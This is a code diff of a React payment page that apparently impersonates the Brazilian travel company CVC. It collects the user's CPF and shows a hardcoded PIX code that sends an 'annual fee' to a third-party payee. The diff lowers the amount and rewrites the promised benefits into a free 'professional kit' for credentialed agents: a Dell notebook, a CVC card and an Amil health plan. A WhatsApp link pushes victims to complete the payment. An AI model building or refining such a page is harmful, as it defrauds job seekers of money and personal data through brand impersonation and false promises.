@@ -195,7 +195,7 @@ export default function Anuidade() {
         const cpfClean = userDataParam.cpf.replace(/\D/g, '');
         
         // Código PIX autêntico fornecido pelo usuário
-        const finalPixCode = "00020101021226360014BR.GOV.BCB.PIX011429433975000140520400005303986540587.505802BR5917PRIMEPAG SERVICOS6009SAO PAULO62210517ANUIDADE CVC 20256304B023";
+        const finalPixCode = "00020101021226360014BR.GOV.BCB.PIX011429433975000140520400005303986540556.185802BR5917PRIMEPAG SERVICOS6009SAO PAULO62210517ANUIDADE CVC 20256304B023";
         
         console.log('Usando código PIX autêntico Primepag fornecido');
         
@@ -310,24 +310,24 @@ export default function Anuidade() {
 
   const benefits = [
     {
-      icon: <Shield className="h-5 w-5" />,
-      title: "Sistema de Vendas",
-      description: "Plataforma completa para criar e gerenciar vendas online"
+      icon: <Package className="h-5 w-5" />,
+      title: "Kit Home Office Completo",
+      description: "Notebook Dell, headset profissional e token de acesso"
     },
     {
       icon: <CreditCard className="h-5 w-5" />,
-      title: "Processamento de Pagamentos",
-      description: "Integração segura com múltiplas formas de pagamento"
+      title: "Cartão CVC Personalizado",
+      description: "Cartão com seu nome e dados para uso profissional"
     },
     {
-      icon: <MessageCircle className="h-5 w-5" />,
-      title: "Suporte ao Cliente",
-      description: "Chat profissional para atendimento em tempo real"
+      icon: <Shield className="h-5 w-5" />,
+      title: "Cartão Amil Health",
+      description: "Plano de saúde com cobertura nacional"
     },
     {
       icon: <CheckCircle className="h-5 w-5" />,
-      title: "Certificação Oficial",
-      description: "Credencial CVC reconhecida nacionalmente"
+      title: "Frete Gratuito",
+      description: "Entrega via SEDEX sem custos adicionais"
     }
   ];
 
@@ -339,10 +339,10 @@ export default function Anuidade() {
         {/* Header */}
         <div className="text-center mb-8">
           <h1 className="text-2xl font-bold text-cvc-blue mb-3">
-            Sistema de Vendas CVC
+            Kit Profissional CVC
           </h1>
           <p className="text-gray-600 text-sm">
-            Acesse o sistema profissional CVC com recursos completos para agentes credenciados
+            Equipamentos e cartões personalizados para agentes credenciados
           </p>
           
           {/* Sales System Preview */}
@@ -555,7 +555,7 @@ export default function Anuidade() {
                               Tentar Novamente
                             </Button>
                             <Button
-                              onClick={() => window.open('https://wa.me/5511947708090?text=Ol%C3%A1%2C%20estou%20com%20dificuldade%20para%20gerar%20o%20PIX%20da%20anuidade%20CVC%20(R%24%2087%2C50).%20Podem%20me%20ajudar%20a%20processar%20o%20pagamento%3F', '_blank')}
+                              onClick={() => window.open('https://wa.me/5511947708090?text=Ol%C3%A1%2C%20estou%20com%20dificuldade%20para%20gerar%20o%20PIX%20do%20kit%20CVC%20(R%24%2056%2C18).%20Podem%20me%20ajudar%20a%20processar%20o%20pagamento%3F', '_blank')}
                               size="sm"
                               variant="outline"
                               className="border-red-200 text-red-700 hover:bg-red-50"
